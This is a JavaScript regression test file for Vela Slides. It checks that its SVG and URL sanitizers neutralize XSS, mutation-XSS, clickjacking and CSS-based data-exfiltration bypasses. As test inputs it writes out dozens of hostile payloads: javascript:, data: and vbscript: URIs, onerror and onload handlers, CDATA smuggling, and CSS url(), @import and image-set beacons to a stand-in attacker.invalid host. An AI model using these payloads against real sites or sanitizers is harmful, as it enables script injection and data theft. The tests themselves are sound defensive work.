// © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
// ── Security: SVG sanitizer bypass regression (v12.44) ───────────────
// The svg block previously used a regex chain that let unquoted and
// whitespace-obfuscated javascript: URIs through. These assert the
// DOM-based sanitizeSvgMarkup() neutralizes the known bypasses.
uiSuite("SVG Sanitizer (XSS)", [
  { name: "Benign svg survives sanitization", fn: async () => {
    const out = sanitizeSvgMarkup("<rect x='1' y='1' width='8' height='8' fill='#3b82f6'/>");
    return out.includes("<rect") && out.includes("#3b82f6");
  }},
  { name: "Unquoted javascript: href stripped (or whole svg rejected)", fn: async () => {
    const out = sanitizeSvgMarkup('<a href=javascript:alert(1)><text>x</text></a>');
    return !/javascript:/i.test(out);
  }},
  { name: "Quoted javascript: href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<a href="javascript:alert(1)"><text>x</text></a>');
    return !/javascript:/i.test(out) && !/href\s*=/i.test(out.replace(/data-blocked-href/gi, ""));
  }},
  { name: "Whitespace-obfuscated scheme neutralized", fn: async () => {
    const out = sanitizeSvgMarkup('<a href="java\tscript:alert(1)"><text>x</text></a>');
    // either attr removed, or whitespace normalized so it is no longer a javascript scheme
    return !/javascript:/i.test(out.replace(/\s+/g, ""));
  }},
  { name: "xlink:href javascript: stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<a xlink:href="javascript:alert(1)"><text>x</text></a>');
    return !/javascript:/i.test(out);
  }},
  { name: "data: URI in href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<image href="data:text/html,<script>alert(1)</script>" />');
    return !/data:/i.test(out);
  }},
  { name: "Event handler attribute stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<rect width="10" height="10" onload="alert(1)" />');
    return !/\bon\w+\s*=/i.test(out);
  }},
  { name: "Event handler on <style> stripped (bare)", fn: async () => {
    // <style> is a common SVG/HTML element: a surviving on* handler goes live on
    // the HTML re-parse. Must be stripped like any other element's handler.
    const out = sanitizeSvgMarkup('<style onload="alert(1)">.a{fill:#000}</style><rect/>');
    return !/\bon\w+\s*=/i.test(out);
  }},
  { name: "Event handler on <style> nested in <desc>/<title> stripped (mXSS)", fn: async () => {
    // desc/title are HTML integration points — the classic namespace-confusion
    // mutation-XSS setup. Neither the nested handler nor a top-level one survives.
    const a = sanitizeSvgMarkup('<desc><style onload="alert(1)">x</style></desc><rect/>');
    const b = sanitizeSvgMarkup('<title><style onload="alert(1)">x</style></title><rect/>');
    return !/\bon\w+\s*=/i.test(a) && !/\bon\w+\s*=/i.test(b);
  }},
  { name: "SVG output has no handler after HTML re-parse (mXSS backstop)", fn: async () => {
    // Independent output-side check: whatever survives must be inert when the
    // sink re-parses it as HTML — no element carries an on* handler.
    const out = sanitizeSvgMarkup('<desc><style onload="alert(1)">x</style></desc><g onclick="alert(2)"><rect/></g>');
    const html = new DOMParser().parseFromString(`<div>${out}</div>`, "text/html");
    return ![...html.querySelectorAll("*")].some((el) => [...el.attributes].some((at) => /^on/i.test(at.name)));
  }},
  { name: "script element stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<g><script>alert(1)</script></g>');
    return !/<script/i.test(out);
  }},
  { name: "foreignObject element stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<foreignObject><img src=x onerror=alert(1)></foreignObject>');
    return !/<foreignobject/i.test(out) && !/onerror/i.test(out);
  }},
  // CSS-text exfil: <style>/<link> inside SVG fire an outbound GET via url() /
  // @import / rel=stylesheet with no CSP backstop. We filter <style> textContent
  // (preserve legitimate class-based styling and url(#fragment) refs that
  // Mermaid/Vera diagrams need), and block <link> outright.
  { name: "SVG <style> with external url() removed (exfil blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>* { background: url("https://attacker.invalid/?d=x") }</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> @import removed (exfil blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>@import url("https://attacker.invalid/x.css");</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/@import/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> with CSS \\XX escape removed (escape-bypass blocked)", fn: async () => {
    // \75rl(...) decodes to url(...) in the CSS parser — escape-token bypass
    const out = sanitizeSvgMarkup('<style>* { background: \\75rl("https://attacker.invalid/") }</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> element stripped (document-global CSS disallowed; shapes still render)", fn: async () => {
    // A <style> is document-global (not SVG-scoped) — dropped outright, not filtered.
    // The shape element survives so geometry still renders; only the class CSS is gone.
    const out = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
    return !/<style[\s>]/i.test(out) && !/#3b82f6/.test(out) && /<rect[^>]*class="node"/i.test(out);
  }},
  { name: "SVG url(#fragment) paint refs preserved via presentation attrs (<style> dropped)", fn: async () => {
    // Paint-server refs belong on presentation attributes, which remain allowed+validated.
    const out = sanitizeSvgMarkup('<rect fill="url(#grad1)" marker-end="url(#mark)" clip-path="url(#c)"/>');
    return /fill="url\(#grad1\)"/.test(out) && /marker-end="url\(#mark\)"/.test(out) && /clip-path="url\(#c\)"/.test(out);
  }},
  // v12.59 — string-source CSS image functions (no url() token) auto-fetch on
  // render. image-set/image/cross-fade/src were the residual bypass of the
  // v12.53 url()-only filter. Vela decks load NOTHING external.
  { name: "SVG <style> image-set() string source removed (beacon blocked)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>[x^="V"]{background:image-set("https://attacker.invalid/b?p=V" 1x)}</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> -webkit-image-set / cross-fade / src() removed", fn: async () => {
    const out = sanitizeSvgMarkup('<style>a{background:-webkit-image-set("https://attacker.invalid/x" 1x)}b{x:cross-fade(url(#a),"https://attacker.invalid/y",50%)}c{x:src("https://attacker.invalid/z")}</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  // v13.18 — detection must not depend on a closing ')': the CSS tokenizer consumes
  // an UNTERMINATED url( to end-of-input and still emits a fetchable url-token, so a
  // paren-balanced regex missed both the bare and quoted unterminated forms.
  { name: "SVG <style> unterminated url( (bare) removed (EOF url-token)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>rect{fill:url(https://attacker.invalid/b?d=x</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> unterminated url( (quoted) removed (EOF url-token)", fn: async () => {
    const out = sanitizeSvgMarkup('<style>rect{fill:url("https://attacker.invalid/b?d=x</style><rect/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG style='…url(https://…' unterminated attr removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect style="background-image:url(https://attacker.invalid/b" mask="url(https://attacker.invalid/m"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG scheme-relative url(//host) removed", fn: async () => {
    const out = sanitizeSvgMarkup('<style>*{background:url(//attacker.invalid/b)}</style><rect fill="url(//attacker.invalid/p)"/>');
    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG <style> @font-face char-exfil removed", fn: async () => {
    const out = sanitizeSvgMarkup('<style>@font-face{font-family:x;src:url(https://attacker.invalid/f)}text{font-family:x}</style><text x="1" y="9">A</text>');
    return !/attacker\.invalid/i.test(out) && !/@font-face/i.test(out) && !/<style[\s>]/i.test(out);
  }},
  { name: "SVG url(#fragment) whitespace on presentation attr preserved (no false reject)", fn: async () => {
    // isSvgStyleSafe still guards url-ref presentation attrs; url( #frag ) must not false-reject.
    const out = sanitizeSvgMarkup('<rect fill="url( #grad )" clip-path="url(#c)"/>');
    return /#grad/.test(out) && /url\(#c\)/.test(out);
  }},
  // v13.46 — CSS custom-property indirection. A lexical value filter inspects the
  // DECLARED text; a custom property is an untyped token bag substituted at
  // computed-value time, i.e. after those checks have run, so an indirected value
  // can re-assemble a fetching primitive the filter never saw. Custom properties
  // also inherit, so the store and the load can sit on different elements.
  { name: "SVG custom-property indirection into an image source removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect style=\'--p:"https:attacker.invalid/b";background-image:image-set(var(--p) 1x)\'/>');
    return !/attacker\.invalid/i.test(out) && !/var\s*\(/i.test(out) && !/--p/.test(out);
  }},
  { name: "SVG custom property inherited across elements (store on <g>, load on child) removed", fn: async () => {
    const out = sanitizeSvgMarkup('<g style=\'--p:"https:attacker.invalid/b"\'><rect style="mask-image:image-set(var(--p) 1x)"/></g>');
    return !/attacker\.invalid/i.test(out) && !/var\s*\(/i.test(out);
  }},
  { name: "SVG attr()/env() indirection removed (whole substitution family)", fn: async () => {
    // attr() reads a DOM attribute the sanitizer preserves verbatim, so the URL
    // never appears in the CSS text; env() binds at the same late stage as var().
    const a = sanitizeSvgMarkup('<rect data-u="https://attacker.invalid/b" style="fill:attr(data-u url)"/>');
    const b = sanitizeSvgMarkup('<rect data-u="url(https://attacker.invalid/b)" fill="attr(data-u)"/>');
    const c = sanitizeSvgMarkup('<rect style="background-image:image-set(env(x) 1x)"/>');
    return !/attr\s*\(|env\s*\(/i.test(a + b + c) && !/\sstyle=/i.test(a) && !/\sfill=/i.test(b);
  }},
  { name: "SVG transform allowlisted in inline style (parity with the transform attribute)", fn: async () => {
    // The transform ATTRIBUTE was never gated, so rejecting only the CSS spelling
    // removed real exported-diagram layout without removing any capability.
    const out = sanitizeSvgMarkup('<g style="transform:translate(10px,10px)"><rect width="10" height="10" fill="red"/></g>');
    return /transform:translate\(10px,10px\)/.test(out) && /fill="red"/.test(out);
  }},
  { name: "SECURITY: neither transform spelling escapes the clipped render sink", fn: async () => {
    // The UI-integrity invariant that makes the line above safe: transform cannot
    // leave an overflow:hidden ancestor (position, which can, stays rejected).
    const host = document.createElement("div");
    host.style.cssText = "width:120px;height:80px;overflow:hidden;position:relative";
    document.body.appendChild(host);
    try {
      host.innerHTML = sanitizeSvgMarkup(
        '<g style="transform:translate(-900px,-900px) scale(60)" transform="translate(-900,-900) scale(60)">' +
        '<rect width="20" height="20" fill="red"/></g>');
      const hb = host.getBoundingClientRect();
      // Hit-test, not bounding rects: SVG clips paint, so a rect over-reports.
      const probes = [[hb.right + 40, hb.bottom + 40], [Math.floor(innerWidth / 2), Math.floor(innerHeight / 2)]];
      const escaped = probes.some(([x, y]) => {
        const el = document.elementFromPoint(x, y);
        return !!(el && host.contains(el));
      });
      const noPositioning = !/position\s*:/i.test(host.innerHTML);
      const rendered = /fill="red"/.test(host.innerHTML);
      return !escaped && noPositioning && rendered;
    } finally { host.remove(); }
  }},
  { name: "SECURITY: deck SVG cannot un-clip its own viewport to cover sibling content", fn: async () => {
    // overflow on an <svg> overrides the UA viewport clip, so a negative-geometry
    // child paints and hit-tests outside the deck's box. Prove it against a real
    // sibling: the escaped rect must not become the element at the sibling's point.
    const sib = document.createElement("div");
    sib.style.cssText = "width:200px;height:60px;background:#ddd";
    const host = document.createElement("div");
    host.style.cssText = "width:60px;height:60px";
    document.body.appendChild(sib); document.body.appendChild(host);
    try {
      host.innerHTML = sanitizeSvgMarkup(
        '<svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" overflow="visible" style="overflow:visible">' +
        '<rect x="-300" y="-300" width="900" height="900" fill="red"/></svg>');
      const r = sib.getBoundingClientRect();
      const hit = document.elementFromPoint(Math.floor(r.left + r.width / 2), Math.floor(r.top + r.height / 2));
      const covered = !!(hit && host.contains(hit));
      const rendered = /<rect/i.test(host.innerHTML);
      return !covered && !/overflow/i.test(host.innerHTML) && rendered;
    } finally { sib.remove(); host.remove(); }
  }},
  { name: "SECURITY: deck SVG cannot break out of foreign content into live HTML", fn: async () => {
    // A breakout makes the HTML parser leave foreign-content mode, so the rest
    // re-parses as live HTML — a real anchor that navigates without going through
    // openExternalLink, and boxes with no SVG viewport clip. Assert on the
    // NAMESPACE of the rendered result, which is what actually distinguishes it.
    const host = document.createElement("div");
    document.body.appendChild(host);
    try {
      host.innerHTML = sanitizeSvgMarkup(
        '<svg xmlns="http://www.w3.org/2000/svg"><font color="a">' +
        '<a href="https://attacker.invalid/steal" style="display:block;width:960px;height:500px">x</a></font></svg>');
      const foreign = Array.from(host.querySelectorAll("*")).filter((el) => el.namespaceURI !== "http://www.w3.org/2000/svg");
      const noLiveAnchor = !host.querySelector('a[href^="https://attacker"]');
      return foreign.length === 0 && noLiveAnchor;
    } finally { host.remove(); }
  }},
  { name: "SVG realistic diagram preserved and wholly SVG-namespaced", fn: async () => {
    const host = document.createElement("div");
    document.body.appendChild(host);
    try {
      host.innerHTML = sanitizeSvgMarkup('<defs><linearGradient id="g"><stop offset="0" stop-color="#f00"/></linearGradient><marker id="m" overflow="visible"><path d="M0,-5L10,0L0,5"/></marker></defs><g transform="translate(4,4)"><rect width="40" height="20" fill="url(#g)"/><line x1="0" y1="0" x2="9" y2="9" marker-end="url(#m)"/></g>');
      const allSvg = Array.from(host.querySelectorAll("*")).every((el) => el.namespaceURI === "http://www.w3.org/2000/svg");
      return allSvg && !!host.querySelector("marker") && !!host.querySelector("g[transform]");
    } finally { host.remove(); }
  }},
  { name: "SECURITY: deck SVG cannot become an invisible click interceptor over sibling content", fn: async () => {
    // transform on the BOUNDARY <svg> relocates the box and its hit-testing while
    // painting nothing — deck content silently takes clicks meant for a neighbour.
    // Victim is static and precedes the host so it cannot out-rank the attacker in
    // paint order (a positioned victim would mask a real escape).
    const victim = document.createElement("div");
    victim.style.cssText = "width:300px;height:60px;background:#dde";
    const host = document.createElement("div");
    host.style.cssText = "width:240px;height:90px";
    document.body.appendChild(victim); document.body.appendChild(host);
    try {
      host.innerHTML = sanitizeSvgMarkup(
        '<svg xmlns="http://www.w3.org/2000/svg" width="240" height="90" transform="scale(20)" style="transform:scale(20)">' +
        '<rect width="240" height="90" fill="none" pointer-events="all"/></svg>');
      const r = victim.getBoundingClientRect();
      const hit = document.elementFromPoint(Math.floor(r.left + r.width / 2), Math.floor(r.top + r.height / 2));
      const intercepts = !!(hit && host.contains(hit));
      const clean = !/transform|pointer-events/i.test(host.innerHTML);
      const rendered = /<rect/i.test(host.innerHTML);
      return !intercepts && clean && rendered;
    } finally { victim.remove(); host.remove(); }
  }},
  { name: "SVG inner transform/filter preserved (diagram layout still works)", fn: async () => {
    const out = sanitizeSvgMarkup('<g transform="translate(5,5)" filter="url(#f)" style="transform-origin:0 0"><rect width="9" height="9" style="filter:blur(2px)"/></g>');
    return /transform="translate\(5,5\)"/.test(out) && /filter="url\(#f\)"/.test(out) &&
           /transform-origin:0 0/.test(out) && /filter:blur\(2px\)/.test(out);
  }},
  { name: "SVG marker overflow=visible preserved (arrowhead idiom)", fn: async () => {
    const out = sanitizeSvgMarkup('<defs><marker id="a" overflow="visible" markerWidth="4" markerHeight="4"><path d="M0,-5L10,0L0,5"/></marker></defs><line x1="0" y1="0" x2="9" y2="9" marker-end="url(#a)"/>');
    return /overflow="visible"/.test(out) && /url\(#a\)/.test(out);
  }},
  { name: "SVG slashless authority (scheme without //) removed", fn: async () => {
    const out = sanitizeSvgMarkup('<rect style="background-image:url(https:attacker.invalid/b)" fill="url(https:attacker.invalid/p)"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG inline-style property allowlist drops image-loading/overlay properties", fn: async () => {
    const out = sanitizeSvgMarkup('<rect fill="red" style="background-image:url(#a);cursor:url(#c),auto;transform:scale(500)"/>');
    return !/style=/i.test(out) && /fill="red"/.test(out);
  }},
  { name: "SVG legitimate paint/text inline style preserved (no false reject)", fn: async () => {
    const out = sanitizeSvgMarkup('<text style="fill:#3b82f6;font-family:Inter,sans-serif;text-anchor:middle;opacity:0.8;text-transform:uppercase;cursor:pointer">A</text>');
    return /fill:#3b82f6/.test(out) && /text-anchor:middle/.test(out) &&
           /text-transform:uppercase/.test(out) && /cursor:pointer/.test(out);
  }},
  { name: "SVG double-hyphen fragment ids preserved (custom-property reject is declaration-anchored)", fn: async () => {
    // `--` inside url(#id) is ordinary id naming, not a custom property: a store
    // can only be introduced at the start of a declaration.
    const out = sanitizeSvgMarkup('<rect fill="url(#grad--blue)" clip-path="url(#clip--1)" style="stroke:url(#s--2)"/>');
    return /url\(#grad--blue\)/.test(out) && /url\(#clip--1\)/.test(out) && /url\(#s--2\)/.test(out);
  }},
  { name: "SECURITY: browser-truth — indirected deck SVG CSS makes no outbound request", fn: async () => {
    // Real-sink proof: render the sanitizer's OUTPUT the way the app does and watch
    // the browser's own resource timeline. A source-level "the regex rejects it" is
    // not evidence that nothing fetched; a PerformanceObserver entry is.
    const host = document.createElement("div");
    document.body.appendChild(host);
    const seen = [];
    const obs = new PerformanceObserver((l) => { for (const e of l.getEntries()) seen.push(e.name); });
    try {
      obs.observe({ entryTypes: ["resource"] });
      host.innerHTML = sanitizeSvgMarkup(
        '<svg xmlns="http://www.w3.org/2000/svg" style=\'--p:"https:attacker.invalid/b1";background-image:image-set(var(--p) 1x)\'>' +
        '<rect style=\'--q:"https:attacker.invalid/b2";mask-image:image-set(var(--q) 1x)\'/></svg>');
      // Poll rather than sleep a fixed window: a failed request to an unresolvable
      // host lands as a resource entry at an unpredictable delay, and a window too
      // short lets the observer see nothing — which would silently reduce this to
      // the string check below and stop it detecting a regression. Bail out early
      // the moment an entry appears (the failing direction needs no waiting).
      for (let i = 0; i < 30 && !seen.length; i++) await new Promise((r) => setTimeout(r, 100));
      for (const e of obs.takeRecords()) seen.push(e.name);
      return !seen.some((u) => /attacker\.invalid/i.test(u)) && !/attacker\.invalid/i.test(host.innerHTML);
    } finally { obs.disconnect(); host.remove(); }
  }},
  { name: "SECURITY: deck SVG <style> cannot restyle/relocate app chrome (S16/S17 redress+clickjack)", fn: async () => {
    // The load-bearing regression test for the UI-integrity family: render a
    // hostile deck SVG the SAME way the app does (sanitize -> innerHTML) and prove
    // deck CSS cannot reach a real app control (no restyle, no reposition, no hide).
    const victim = document.createElement("button");
    victim.setAttribute("title", "Delete slide (Del)");
    victim.style.background = "rgb(1, 2, 3)";
    document.body.appendChild(victim);
    const host = document.createElement("div");
    document.body.appendChild(host);
    try {
      const payload = '<style>button[title^="Delete slide"]{position:fixed !important;background:rgb(34,197,94) !important;opacity:0 !important}*{color:red !important}</style><rect width="10" height="10"/>';
      host.innerHTML = sanitizeSvgMarkup(payload);
      const noStyle = !host.querySelector("style") && !/<style[\s>]/i.test(host.innerHTML);
      const cs = getComputedStyle(victim);
      const bg = (cs.backgroundColor || "").replace(/\s/g, "");
      const unaffected = bg === "rgb(1,2,3)" && cs.position !== "fixed" && cs.opacity === "1";
      return noStyle && unaffected;
    } finally { host.remove(); victim.remove(); }
  }},
  { name: "SECURITY: deck SVG inline style cannot overlay app chrome (fixed-position clickjack)", fn: async () => {
    // R4A vector: the <style> ELEMENT was removed, but an inline style="" on an SVG
    // element carrying position:fixed/inset/z-index/viewport-sizing escapes the
    // non-clipped study-notes/teacher diagram sinks and overlays whole-app chrome.
    // Prove the real sanitizer output produces no viewport-covering fixed/absolute element.
    const host = document.createElement("div");
    document.body.appendChild(host);
    try {
      const payload = '<rect fill="red" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;pointer-events:auto"/><g style="position:fixed;inset:0;z-index:99999"><rect width="50" height="50"/></g>';
      host.innerHTML = sanitizeSvgMarkup(payload);
      const overlay = Array.from(host.querySelectorAll("*")).some((el) => {
        const p = getComputedStyle(el).position;
        return p === "fixed" || p === "absolute";
      });
      const mid = document.elementFromPoint(Math.floor(innerWidth / 2), Math.floor(innerHeight / 2));
      const covered = !!(mid && host.contains(mid));
      const clean = !/position\s*:/i.test(host.innerHTML) && !/z-index/i.test(host.innerHTML) && /fill="red"/.test(host.innerHTML);
      return !overlay && !covered && clean;
    } finally { host.remove(); }
  }},
  { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
    const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG <feImage href> external removed (Roundcube class)", fn: async () => {
    const out = sanitizeSvgMarkup('<filter><feImage href="https://attacker.invalid/b.png"/><feImage xlink:href="https://attacker.invalid/c.png"/></filter>');
    return !/attacker\.invalid/i.test(out);
  }},
  { name: "SVG #fragment paint refs + <a> https click-link preserved (v12.59)", fn: async () => {
    const refs = sanitizeSvgMarkup('<rect fill="url(#grad)" clip-path="url(#c)"/>');
    const link = sanitizeSvgMarkup('<a href="https://example.com/x"><text>hi</text></a>');
    return /url\(#grad\)/.test(refs) && /url\(#c\)/.test(refs) && /href="https:\/\/example\.com\/x"/.test(link);
  }},
  { name: "SVG <link rel=stylesheet> stripped outright", fn: async () => {
    const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
    return !/<link/i.test(out) && !/attacker\.invalid/i.test(out);
  }},
  // Mutation-XSS round-trip: sanitize, then re-parse as HTML exactly like
  // dangerouslySetInnerHTML does, and assert no live event handler materializes.
  { name: "CDATA-in-style mXSS round-trip neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<style><![CDATA[</style><img src=x onerror=alert(1)>]]" + "></style>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !_$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name)));
  }},
  { name: "CDATA-in-text mXSS round-trip neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<text><![CDATA[</text><img src=x onerror=alert(1)>]]" + "></text>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !_$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name)));
  }},
  { name: "Comment-node smuggling neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<!--<img src=x onerror=alert(1)>-->");
    const d = document.createElement("div"); d.innerHTML = out;
    return !d.querySelector("img") && !/onerror/i.test(out);
  }},
  { name: "sanitizeUrl blocks javascript:/data:/vbscript:", fn: async () => {
    return sanitizeUrl("javascript:alert(1)") === "" &&
           sanitizeUrl("data:text/html,<script>alert(1)</script>") === "" &&
           sanitizeUrl("vbscript:msgbox(1)") === "" &&
           sanitizeUrl("https://example.com/x") === "https://example.com/x";
  }},
  { name: "sanitizeUrl rejects UNC/backslash/protocol-relative refs (parse-vs-emit)", fn: async () => {
    // A schemeless authority ref parses as http(s) (passing the allowlist) but
    // must not survive raw into an export hyperlink target — it is rejected, not
    // emitted verbatim. http(s) links come back in canonical form.
    return sanitizeUrl("\\\\host\\share\\x") === "" &&
           sanitizeUrl("//host.example/x") === "" &&
           sanitizeUrl("/\\host/x") === "" &&
           sanitizeUrl("http:\\\\host\\x") === "" &&
           sanitizeUrl("https:/host.example") === "" &&
           sanitizeUrl("https://host.example/a") === "https://host.example/a" &&
           sanitizeUrl("data:image/png;base64,AAAA", ["data:"]) === "data:image/png;base64,AAAA";
  }},
  { name: "item-level links sanitized by sanitizeBlock", fn: async () => {
    const ir = sanitizeBlock({ type: "icon-row", items: [{ text: "x", link: "javascript:alert(1)" }] });
    const fl = sanitizeBlock({ type: "flow", items: [{ label: "n", link: "javascript:alert(1)" }] });
    return !ir.items[0].link && !fl.items[0].link;
  }},
  { name: "SMIL animate/animateTransform/animateMotion stripped", fn: async () => {
    const a = sanitizeSvgMarkup('<a><animate attributeName="href" to="javascript:alert(1)" begin="0s"/><text>x</text></a>');
    const t = sanitizeSvgMarkup('<rect><animateTransform attributeName="transform" type="rotate" onbegin="alert(1)"/></rect>');
    const mo = sanitizeSvgMarkup('<rect><animateMotion onbegin="alert(1)" dur="1s"/></rect>');
    return !/<animate/i.test(a) && !/<animatetransform/i.test(t) && !/<animatemotion/i.test(mo) && !/onbegin/i.test(t + mo);
  }},
  // Entity-encoded scheme: parser decodes &#58;/&#x3a;/&#115; before the scheme check runs
  { name: "Entity-encoded javascript: scheme stripped (dec/hex/letter)", fn: async () => {
    const hasJsAnchor = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a", d).some((a) => /^\s*javascript:/i.test((a.getAttribute("href") || "").replace(/\s/g, ""))); };
    return !hasJsAnchor('<a href="javascript&#58;alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="javascript&#x3a;alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="java&#115;cript:alert(1)"><text>x</text></a>');
  }},
  // Regex-class bypasses: tag reconstruction + unclosed/incomplete tags → fail-closed empty output
  { name: "Tag-reconstruction <scr<script>..ipt> neutralized", fn: async () => {
    const out = sanitizeSvgMarkup("<scr<script></script>ipt>alert(1)</scr<script></script>ipt>");
    const d = document.createElement("div"); d.innerHTML = out;
    return !/<script/i.test(out) && !d.querySelector("script");
  }},
  // sanitizeString: single-pass /<[^>]*>/ is incomplete (an unclosed "<script" has
  // no ">" to match, and reconstruction can rejoin fragments). Fixpoint loop +
  // residual "<" strip must leave no live tag opener, while bare "<" math survives.
  { name: "sanitizeString neutralizes unclosed/reconstructed tags", fn: async () => {
    const bad = ["<script", "<scr<script>ipt>alert(1)", "<img src=x onerror=alert(1)", "<<script>>alert"];
    const clean = bad.every((s) => { const o = sanitizeString(s); return !/<script/i.test(o) && !/<[a-z!/]/i.test(o); });
    return clean && sanitizeString("a < b") === "a < b";
  }},
  { name: "Unclosed iframe/embed/script/foreignObject neutralized", fn: async () => {
    const danger = (mk) => { const out = sanitizeSvgMarkup(mk); const d = document.createElement("div"); d.innerHTML = out;
      return !!d.querySelector("iframe,embed,script,foreignObject") ||
             _$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name))); };
    return !danger('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">') &&
           !danger('<embed src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">') &&
           !danger("<script>alert(1)") &&
           !danger("<foreignObject><img src=x onerror=alert(1)>");
  }},
  { name: "vbscript: via xlink:href stripped", fn: async () => {
    const out = sanitizeSvgMarkup('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="vbscript:msgbox(1)"><text>x</text></a></svg>');
    return !/vbscript:/i.test(out);
  }},
  // Mixed-case schemes — DOMParser preserves case in attribute values; the sanitizer
  // must fold case before scheme comparison.
  { name: "Mixed-case javascript:/data:/vbscript: schemes stripped", fn: async () => {
    const hasJsAnchor = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a,image", d).some((el) => {
        const v = (el.getAttribute("href") || el.getAttribute("xlink:href") || "").replace(/[\u0000-\u0020]/g, "").toLowerCase();
        return v.startsWith("javascript:") || v.startsWith("data:") || v.startsWith("vbscript:"); }); };
    return !hasJsAnchor('<a href="JaVaScRiPt:alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="JAVASCRIPT:alert(1)"><text>x</text></a>') &&
           !hasJsAnchor('<a href="Data:text/html,<script>alert(1)</script>"><text>x</text></a>') &&
           !hasJsAnchor('<a xlink:href="VbScript:msgbox(1)"><text>x</text></a>');
  }},
  // Allowlist enforcement — unexpected protocols (file:, blob:, chrome:, intent:) must be
  // stripped after browser normalization, not just the historic js:/data:/vbscript: trio.
  { name: "Unexpected protocols (file:/blob:/chrome:/intent:) stripped from href", fn: async () => {
    const has = (mk, scheme) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      return _$$("a", d).some((el) => (el.getAttribute("href") || "").toLowerCase().startsWith(scheme)); };
    return !has('<a href="file:///etc/passwd"><text>x</text></a>', "file:") &&
           !has('<a href="blob:https://x/abc"><text>x</text></a>', "blob:") &&
           !has('<a href="chrome://settings"><text>x</text></a>', "chrome:") &&
           !has('<a href="intent://x"><text>x</text></a>', "intent:");
  }},
  // Allowlisted schemes + fragment + relative must SURVIVE the allowlist (regression guard).
  { name: "Allowlisted href schemes preserved (http/https/mailto/tel/#frag/relative)", fn: async () => {
    const keptHref = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
      const a = d.querySelector("a"); return a && a.getAttribute("href"); };
    return !!keptHref('<a href="https://example.com/x"><text>x</text></a>') &&
           !!keptHref('<a href="http://example.com/x"><text>x</text></a>') &&
           !!keptHref('<a href="mailto:a@b.c"><text>x</text></a>') &&
           !!keptHref('<a href="tel:+15551234"><text>x</text></a>') &&
           !!keptHref('<a href="#anchor"><text>x</text></a>') &&
           !!keptHref('<a href="path/to/x.svg"><text>x</text></a>');
  }},
]);

// ── Security: deck-level sanitization (fail-closed + clamp + IMPORT_CONCEPTS) ──
uiSuite("Deck Sanitization (XSS)", [
  { name: ">50 lanes clamps to 50 without throwing (no fail-open trigger)", fn: async () => {
    const lanes = []; for (let i = 0; i < 60; i++) lanes.push({ title: "L" + i, items: [] });
    let threw = false, res = null;
    try { res = validateAndSanitizeDeck({ deckTitle: "x", lanes }); } catch (e) { threw = true; }
    return !threw && res && res.lanes.length === 50;
  }},
  { name: "Large deck still sanitizes item-level javascript: link", fn: async () => {
    const lanes = [{ title: "L0", items: [{ title: "m", slides: [{ blocks: [
      { type: "icon-row", items: [{ text: "Click", link: "javascript:alert(1)" }] }] }] }] }];
    for (let i = 1; i < 60; i++) lanes.push({ title: "L" + i, items: [] });
    const res = validateAndSanitizeDeck({ deckTitle: "x", lanes });
